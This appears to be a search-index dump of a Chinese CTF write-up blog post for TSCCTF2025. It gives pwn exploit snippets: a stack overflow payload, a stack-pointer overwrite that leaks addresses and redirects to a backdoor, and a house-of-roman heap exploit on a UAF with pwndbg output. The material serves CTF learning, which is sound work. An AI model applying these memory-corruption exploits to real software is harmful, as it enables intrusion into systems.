[{"categories":["wp"],"content":"hoo","date":"2025-01-29","objectID":"/posts/814a8c6/","tags":["wp"],"title":"Tscctf2025","uri":"/posts/814a8c6/"},{"categories":["wp"],"content":"TSCCTF2025\r","date":"2025-01-29","objectID":"/posts/814a8c6/:1:0","tags":["wp"],"title":"Tscctf2025","uri":"/posts/814a8c6/"},{"categories":["wp"],"content":"gamble_bad_bad\rrv = b'\\xa1\\x8d\\xef\\xbc\\x9a' payload = b'a' * 0x14 + b'\\x37\\x37\\x37\\x00' pause() sla(rv, payload) ","date":"2025-01-29","objectID":"/posts/814a8c6/:2:0","tags":["wp"],"title":"Tscctf2025","uri":"/posts/814a8c6/"},{"categories":["wp"],"content":"Localstack\rmenu = b'\u003e\u003e ' def push(value): sla(menu, f'push {str(value)}'.encode()) print(f'push {(str(value))}') def pop(): sla(menu, b'pop') def show(): sla(menu, b'show') def ex1t(): sla(menu, b'exit') rv_list = [] rv = 0 for i in range(9): pop() ru(b'Popped ') rv = int(ru(b' ')[:-1]) print(hex(rv)) if rv \u003e= 0: rv_list.append(rv) else: rv_list.append((rv + 0xffffffffffffffff + 1) \u0026 0xffffffffffffffff) show() libc_base = rv - 0x7f410 lg(\"libc_base\") for i in range(1, len(rv_list))[::-1]: print(i) # print(hex(rv_list[i])) push(rv_list[i]) push(29) push(30) push(libc_base) ia() pop泄露地址，push写地址，国外比赛是不是都喜欢出覆盖计数指针的题，上次才见过一个只能一个字节一个字节写的题也是打计数指针，算一下rsp到rbp的偏移就行 这样可以写返回地址了，然后看了眼有后门函数，那就不用泄露libc了，泄露出pie_base然后写print_flag+pie_base即可 ","date":"2025-01-29","objectID":"/posts/814a8c6/:3:0","tags":["wp"],"title":"Tscctf2025","uri":"/posts/814a8c6/"},{"categories":["wp"],"content":"noview\r有uaf，没有show函数，肯定是打roman，为了方便，我patch了2.23的，复习一下 house of roman的关键还是在于这个既在fastbin里，又在unsortedbin里的bin 在有uaf或者off by one的情况下都可以使用下面这种方法： add(0, 0x60, ) # 000 edit(0, p64(0) + p64(0x71)) add(1, 0x60) # 070 edit(1, b'ffff') add(2, 0x60) # 0f0 edit(2, p64(0) * 3 + p64(0x51)) delete(0) delete(1) # delete 070 edit(1, p8(0x10)) add(3, 0x60) # add 070 edit(3, b'gggg') add(4, 0x60) # add 010 edit(4, p64(0) * 0xb + p64(0x71)) delete(3) edit(4, p64(0) * 0xb + p64(0x91)) delete(3) 关键就在于使用off-by-one或者uaf，将fastbin的大小换成unsortedbin的，然后重新free一次 找到可以作为size的地址0x7efd01c1b73d，然后将其低两位写入一个unsortedbin中的main_arena+96指针中 Free chunk (unsortedbin) | PREV_INUSE Addr: 0x56206343b2b0 Size: 0x810 (with flag bits: 0x811) fd: 0x7f910fe1b73d bk: 0x7f910fe1ace0 Allocated chunk Addr: 0x56206343bac0 Size: 0x20 (with flag bits: 0x20) Top chunk | PREV_INUSE Addr: 0x56206343bae0 Size: 0x20520 (with flag bits: 0x20521) pwndbg\u003e tele 0x56206343b2b0 00:0000│ 0x56206343b2b0 ◂— 0x0 01:0008│ 0x56206343b2b8 ◂— 0x811 02:0010│ 0x56206343b2c0 —▸ 0x7f910fe1b73d (_IO_2_1_stderr_+157) ◂— 0x910fe1a8a0000000 03:0018│ 0x56206343b2c8 —▸ 0x7f910fe1ace0 (main_arena+96) —▸ 0x56206343bae0 ◂— 0x0 04:0020│ 0x56206343b2d0 ◂— 0x0 ... ↓ 3 skipped 分配两次，第二次分配就可以覆盖_IO_2_1_stdout_的_IO_write_base低位为\\x00 ","date":"2025-01-29","objectID":"/posts/814a8c6/:4:0","tags":["wp"],"title":"Tscctf2025","uri":"/posts/814a8c6/"}]